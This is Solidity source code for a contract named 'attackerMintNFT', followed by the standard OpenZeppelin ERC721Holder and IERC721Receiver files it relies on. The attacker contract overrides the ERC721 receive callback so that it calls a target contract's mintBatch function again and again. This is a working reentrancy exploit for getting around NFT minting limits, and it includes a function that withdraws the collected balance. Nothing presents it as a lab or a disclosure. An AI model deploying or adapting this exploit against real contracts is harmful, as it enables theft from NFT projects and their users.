pragma solidity = 0.8.4;

import "@openzeppelin/contracts/token/ERC721/utils/ERC721Holder.sol";

contract attackerMintNFT is ERC721Holder {

  address public contractToAttack;

  function setAddress(address _contractToAttack) external {
    contractToAttack = _contractToAttack;
  }

  function onERC721Received(address sender, address from, uint256 tokenId, bytes memory data) public override returns (bytes4){
    (bool success, ) = contractToAttack.call{value: 0.05 ether, gas: 6000000}(abi.encodeWithSignature("mintBatch(uint256)", 5));

    return super.onERC721Received(sender, from, tokenId, data);

  }

  function attack() public {

    (bool sucess, ) = contractToAttack.call{value: 0.05 ether, gas: 6000000}(abi.encodeWithSignature("mintBatch(uint256)", 5));
  }

  fallback() external payable {

  }

  function withdraw(address account) external {
    uint balance = address(this).balance;
    payable(account).transfer(balance);
  }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "../IERC721Receiver.sol";

/**
 * @dev Implementation of the {IERC721Receiver} interface.
 *
 * Accepts all token transfers.
 * Make sure the contract is able to use its token with {IERC721-safeTransferFrom}, {IERC721-approve} or {IERC721-setApprovalForAll}.
 */
contract ERC721Holder is IERC721Receiver {
    /**
     * @dev See {IERC721Receiver-onERC721Received}.
     *
     * Always returns `IERC721Receiver.onERC721Received.selector`.
     */
    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) public virtual override returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title ERC721 token receiver interface
 * @dev Interface for any contract that wants to support safeTransfers
 * from ERC721 asset contracts.
 */
interface IERC721Receiver {
    /**
     * @dev Whenever an {IERC721} `tokenId` token is transferred to this contract via {IERC721-safeTransferFrom}
     * by `operator` from `from`, this function is called.
     *
     * It must return its Solidity selector to confirm the token transfer.
     * If any other value is returned or the interface is not implemented by the recipient, the transfer will be reverted.
     *
     * The selector can be obtained in Solidity with `IERC721.onERC721Received.selector`.
     */
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4);
}